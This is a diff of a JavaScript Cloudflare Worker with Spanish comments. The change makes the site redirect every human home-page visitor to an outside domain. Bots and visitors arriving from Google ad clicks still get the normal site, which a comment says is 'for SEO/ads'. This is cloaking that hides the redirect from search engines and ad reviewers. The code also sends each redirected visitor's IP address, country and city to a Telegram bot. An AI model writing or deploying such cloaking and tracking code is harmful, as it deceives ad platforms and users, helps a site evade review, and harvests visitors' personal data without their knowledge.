@@ -13,45 +13,28 @@ export default {
     const isAdClick = url.searchParams.has("gclid");
     const isHome = path === "/" || path === "/index.html";
 
-    // --- DATOS DESDE VARIABLES DE ENTORNO ---
+    // --- DATOS DESDE VARIABLES DE ENTORNO (opcional) ---
     const TOKEN = env.TELEGRAM_TOKEN;
     const CHAT_ID = env.TELEGRAM_CHAT_ID;
-    // ----------------------------------------
+    // ---------------------------------------------------
 
-    // Diagnóstico: revisa en los logs de Cloudflare qué país detecta
     console.log(`[GEO] country=${country} city=${city} path=${path} bot=${isBot} ad=${isAdClick}`);
 
-    // 1. Redirección para EE.UU. -> /us.html
-    if (country === "US" && isHome && !isBot && !isAdClick) {
+    // 1. TODAS las visitas (excepto bots y clics de anuncios) -> escolombia.lat
+    if (isHome && !isBot && !isAdClick) {
       if (TOKEN && CHAT_ID) {
         ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID,
-          `🇺🇸 Visitante de EE.UU. redirigido a Inglés\nCiudad: ${city}\nIP: ${ip}`));
-      }
-      return Response.redirect(new URL("/us.html", request.url).toString(), 302);
-    }
-
-    // 2. Redirección para Argentina -> escolombia.lat
-    if (country === "AR" && isHome && !isBot && !isAdClick) {
-      if (TOKEN && CHAT_ID) {
-        ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID,
-          `🇦🇷 Visitante de Argentina redirigido a escolombia.lat\nCiudad: ${city}\nIP: ${ip}`));
+          `↪️ Visitante redirigido a escolombia.lat\nPaís: ${country}\nCiudad: ${city}\nIP: ${ip}`));
       }
       return Response.redirect("https://escolombia.lat/", 302);
     }
 
-    // 3. Notificación de visita normal
-    if (!isBot && TOKEN && CHAT_ID) {
-      const pageType = path.includes("us.html") ? "Inglés 🇺🇸" : "Español 🇨🇴";
-      ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID,
-        `🌍 Nueva visita en NexoDigital\nPágina: ${pageType}\nPaís: ${country}\nCiudad: ${city}\nIP: ${ip}`));
-    }
-
-    // 4. Entrega de archivos estáticos
+    // 2. Bots y clics de anuncios: se les entrega el sitio normal (para SEO/ads)
     return env.ASSETS.fetch(request);
   }
 };
 
-// Envío a Telegram con timeout para no colgar el worker
+// Envío a Telegram con timeout
 async function enviarTelegram(token, chatId, text) {
   const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
   try {
